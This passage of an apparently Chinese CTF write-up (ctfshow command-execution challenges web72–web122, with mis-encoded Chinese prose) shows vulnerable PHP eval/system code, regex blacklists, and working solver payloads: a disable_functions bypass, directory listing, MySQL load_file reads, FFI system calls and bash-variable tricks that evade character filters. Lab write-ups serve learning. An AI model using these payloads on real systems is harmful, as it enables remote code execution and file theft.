class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#éœ€è¦é€šè¿‡urlç¼–ç å“¦</span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡burpsuiteæŠ“åŒ…ï¼Œç„¶åæŠŠpostçš„cæ›¿æ¢æˆexpï¼Œæ¥ç€æŒ‰ç…§å›¾ä¸­æ‰€ç¤ºæ­¥éª¤è¿›è¡Œurlç¼–ç <br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web72/QY87%60Y%6055E%29Y_VI_AVTW294.png" alt=""><br>
å‘é€æ•°æ®åŒ…åå¯è·å¾—flag</p>
<h3 id="web73"><a class="header-anchor" href="#web73">Â¶</a>web73</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è€è§„çŸ©ï¼Œå…ˆçœ‹ç›®å½•ï¼Œè‚¯å®šåˆæ”¹åäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p>æœç„¶ï¼Œflagæ–‡ä»¶ç°åœ¨æ˜¯flagc.txtï¼Œå…ˆå°è¯•èƒ½ä¸èƒ½è¯»å–ï¼Œå¥½å®¶ä¼™ï¼Œèƒ½ç›´æ¥è¯»å–ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flagc.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<h3 id="web74"><a class="header-anchor" href="#web74">Â¶</a>web74</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡flagåœ¨flagx.txté‡Œï¼Œpaylaodå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<h3 id="web75"><a class="header-anchor" href="#web75">Â¶</a>web75</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡flagåœ¨flag36.txté‡Œï¼Œå¥½å®¶ä¼™åˆè¯»å–ä¸æˆåŠŸå¼€å§‹é™åˆ¶äº†ï¼Œåæ¥çœ‹äº†ä¸‹hintï¼Œè¿™é¢˜ç”¨çš„mysqlçš„load_fileè¿›è¡Œè¯»å–æ–‡ä»¶ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,</span><br><span class="line">&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>
<p>è¿˜æ˜¯åœ¨burpsuiteä¸­è¿›è¡Œurlç¼–ç åå‘åŒ…æ‹¿åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web75/0W2_V3__ZICVWGSHCN53GJF.png" alt=""></p>
<h3 id="web76"><a class="header-anchor" href="#web76">Â¶</a>web76</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹ç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡å‘ç°flagåœ¨flag36d.txtä¸­ï¼Œè¿˜æ˜¯ä¸Šé¢˜è€å¥—è·¯ï¼Œç”¨load_fileè¯»å–æ–‡ä»¶ï¼Œpaylaod</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,</span><br><span class="line">&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36d.txt&quot;)&#39;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>
<p>è®°å¾—è¿›è¡Œurlç¼–ç ï¼Œå‘åŒ…åå¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web76/F%24%40QVT1OP_H%604N%29VZF_%28T37.png" alt=""></p>
<h3 id="web77"><a class="header-anchor" href="#web77">Â¶</a>web77</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç»§ç»­è¯»å–ç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/S6%25~_S%60_K%40WD%60%25WFTJ%5BKK%7BN.png" alt=""><br>
å‘ç°ä¸€ä¸ªflag36x.txtå’Œreadflagï¼Œé¢˜ç›®æç¤ºäº†php7.4ï¼Œæœäº†ä¸€ä¸‹æ˜¯åˆ©ç”¨FF1æ‹“å±•(php7.4å¼€å§‹æ‰æœ‰)ï¼Œpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;?&gt;&lt;?php $ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;&#x2F;readflag &gt;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œflag36x.txtè¯»å–ä¸å‡ºæ¥æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥åˆ©ç”¨readflagé‚£ä¸ªæ–‡ä»¶ï¼ŒæŠŠä»–è¾“å‡ºåˆ°æ–°æ–‡ä»¶flag.txtä¸­<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/6A6%7DHTF3SLM%7D7%40C~F%5DY0LLE.png" alt=""><br>
æ¥ç€è®¿é—®flag.txtå°±å¯ä»¥è·å¾—flagäº†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web77/ONRI4J8%29WFX9K8%40_%257S%5BFA4.png" alt=""></p>
<h3 id="web118"><a class="header-anchor" href="#web118">Â¶</a>web118</h3>
<p>é¢˜ç›®æç¤ºflagåœ¨flag.phpä¸­ï¼Œæ‰“å¼€é¡µé¢ï¼Œæœ‰ä¸€ä¸ªè¾“å…¥æ¡†<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/BT%25VT%409XZ0M%40I7%24WYUDF%25V0.png" alt=""><br>
å³é”®æŸ¥çœ‹æºç æç¤ºæ˜¯:<code>system($code);</code>ï¼Œfuzzå°è¯•ä¹‹åå‘ç°åªæœ‰å¤§å†™å­—æ¯å’Œ${}:?.~ç­‰ç­‰å­—ç¬¦å¯ä»¥é€šè¿‡ï¼Œå¯ä»¥ä½¿ç”¨bashå†…ç½®å˜é‡è¿›è¡Œåˆ©ç”¨<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/CIVB%240HL%7B%5B%5D%29X_%5B_8S8_AT8.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# echo $&#123;PWD&#125; </span><br><span class="line">&#x2F;root</span><br><span class="line">                                                                                                      </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# echo $&#123;PWD:0:1&#125;      #è¡¨ç¤ºä»0ä¸‹æ ‡å¼€å§‹çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">&#x2F;                                                                                                                                                                                       </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# echo $&#123;PWD:~0:1&#125;      #ä»ç»“å°¾å¼€å§‹å¾€å‰çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">t</span><br><span class="line">                                                                                </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# echo $&#123;PWD:~0&#125;      </span><br><span class="line">t</span><br><span class="line">                                                                             </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# echo $&#123;PWD:~A&#125;       #æ‰€ä»¥å­—æ¯å’Œ0å…·æœ‰åŒæ ·ä½œç”¨             </span><br><span class="line">t</span><br><span class="line">                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# echo $&#123;PATH&#125;                            </span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# echo $&#123;PATH:~A&#125;                </span><br><span class="line">n</span><br><span class="line">                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# ls                                      </span><br><span class="line">Desktop  Documents  Downloads  flag.txt  Music  Pictures  Public  Templates  Videos</span><br><span class="line">                                                                                              </span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# $&#123;PATH:~A&#125;l flag.txt</span><br><span class="line">     1  flag&#123;test&#125;</span><br><span class="line">                    </span><br></pre></td></tr></table></figure>
<p>ä»ä¸­å‘ç°æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºnlå‘½ä»¤è¿›è¡Œè¯»å–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;$&#123;PATH&#125;</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line"></span><br><span class="line">$&#123;PWD&#125;</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥payloadä¸º</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/BT%25VT%409XZ0M%40I7%24WYUDF%25V0.png" alt=""><br>
ç„¶åå³é”®æºç å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web118/T%5DH9NIZHXVX%5BQ8R%24FVBF~6B.png" alt=""></p>
<h3 id="web119"><a class="header-anchor" href="#web119">Â¶</a>web119</h3>
<p>è¿™æ¬¡åœ¨å‰é¢çš„åŸºç¡€ä¸ŠæŠŠpathç»™ç¦äº†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ— æ³•è·å¾—nè¿™ä¸ªå­—æ¯ï¼Œä¹Ÿå°±æ— æ³•æ„æˆäº†nlå‘½ä»¤ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•æ„é€ ä¸€ä¸‹<code>/bin/cat</code>ï¼Œè€Œæƒ³è¦åŒ¹é…åˆ°æˆ‘ä»¬è‡³å°‘éœ€è¦ä¸€ä¸ª<code>/</code>ç¬¦å·å’Œä¸€ä¸ª<code>cat</code>ä¸­çš„ä¸€ä¸ªå­—æ¯ï¼Œè¿™é‡Œä½¿ç”¨<code>$&#123;SHLVL&#125;</code>æ¥é…åˆæ„é€ <code>/</code></p>
<blockquote>
<p>SHLVL æ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨,è¿›ç¨‹ç¬¬ä¸€æ¬¡æ‰“å¼€shellæ—¶${SHLVL}=1ï¼Œç„¶ååœ¨æ­¤shellä¸­å†æ‰“å¼€ä¸€ä¸ªshellæ—¶$SHLVL=2ã€‚</p>
</blockquote>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/PD59VJBEX0%294%5DVX%4082PHKLD.png" alt=""><br>
ä¸€èˆ¬ç»™çš„æƒé™éƒ½æ˜¯www-dataï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨<code>$&#123;USER&#125;</code>å¯ä»¥è·å¾—â€œwww-dataâ€ï¼Œè€Œæˆ‘ä»¬è¦å–åˆ°atçš„è¯éœ€è¦<code>$&#123;USER:~2:2&#125;</code>ï¼Œä½†æ•°å­—æ˜¯è¢«ç¦äº†ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬è¿˜éœ€è¦æƒ³æƒ³æ€ä¹ˆæ„é€ å‡º2ï¼Œç¿»äº†ç¿»ï¼Œè¿™è¦ä»€ä¹ˆæ¥ä»€ä¹ˆäº†ï¼Œçœ‹è§phpçš„ç‰ˆæœ¬æ˜¯7.3.22ï¼Œæ­£å¥½åŒ…å«æ•°å­—2ï¼Œæ‰€ä»¥åˆ©ç”¨<code>PHP_VERSION</code><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/3%60%40_Y1%241%5DVGXB1YAX_O%40YZL.png" alt=""><br>
æ‰€ä»¥æ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œæ„é€ payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure>
<p>å›è½¦åå³é”®æºç çœ‹åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web119/~V_%29Z5%7D%284%247%401WZ%5BKKT_KPC.png" alt=""></p>
<h3 id="web120"><a class="header-anchor" href="#web120">Â¶</a>web120</h3>
<p>è¿™æ¬¡å˜æˆæºç äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡é™åˆ¶payloadé•¿åº¦åœ¨65ä»¥å†…ï¼Œä¸Šé¢˜æˆ‘ä»¬payloadè¾¾åˆ°99çš„é•¿åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‚å½“å‡å°‘ä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±ä¸å–www-dataä¸­çš„atï¼Œåªå–aè¿›è¡ŒåŒ¹é…ï¼Œå¥½å®¶ä¼™é‚£æˆ‘ä¸Šé¢˜è¿˜æƒ³åŠå¤©æ„é€ æ•°å­—2(å¤ªèœäº†)ï¼Œå°è¯•æ„é€ å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line"></span><br><span class="line">ä½†å‘ç°é•¿åº¦æ˜¯66è¿˜æ˜¯è¶…äº†ï¼Œæ¥ç€æˆ‘ä»¬æŠŠ$&#123;#&#125;å»æ‰ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">code&#x3D;$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure>
<p>å³é”®æºç å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web120/%5D%400%402N%25U%28%242%29DRO2%7BW%29ELWU.png" alt=""></p>
<h3 id="web121"><a class="header-anchor" href="#web121">Â¶</a>web121</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
<p>è¿™æ¬¡æŠŠUSERç»™ç¦äº†ï¼Œé¦–å…ˆæˆ‘ä»¬ç°åœ¨å¯ä»¥åˆ©ç”¨çš„æ˜¯PWDï¼Œä¹Ÿå°±æ˜¯â€œ/var/www/htmlâ€ï¼Œå¯¹åº”äº†ä¸€ä¸‹binä¸­çš„å‘½ä»¤ï¼Œå‘ç°æˆ‘ä»¬å¯ä»¥å–ræ¥æ„é€ <code>/bin/rev</code>å–åå‘½ä»¤è¯»å–æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦æ„é€ å‡º<code>$&#123;PWD:3:1&#125;</code>çš„æ•ˆæœ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨$&#123;IFS&#125;å’Œ$&#123;#&#125;åˆ†åˆ«æ›¿ä»£</span><br><span class="line"></span><br><span class="line">$&#123;#IFS&#125;åœ¨ubuntuç­‰ç³»ç»Ÿä¸­å€¼ä¸º3ï¼Œæˆ‘åœ¨kaliä¸­æµ‹è¯•å€¼ä¸º4</span><br><span class="line"></span><br><span class="line">$&#123;#&#125;ä¸ºæ·»åŠ åˆ°shellçš„å‚æ•°ä¸ªæ•°ï¼Œ$&#123;##&#125;åˆ™ä¸ºå€¼</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æ„æˆpayloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web121/%28Q6E%60%5BJ3U4RPV9O%29RWZA%60NV.png" alt=""><br>
æ¥ç€å»kalié‡Œé¢å†å–åä¸€æ¬¡å³å¯å¾—åˆ°flag<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web121/R%60WY22FV%40%25ZUY5%5BSK%7BRT%25%7DH.png" alt=""></p>
<h3 id="web122"><a class="header-anchor" href="#web122">Â¶</a>web122</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, $code))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen($code)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system($code).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure>
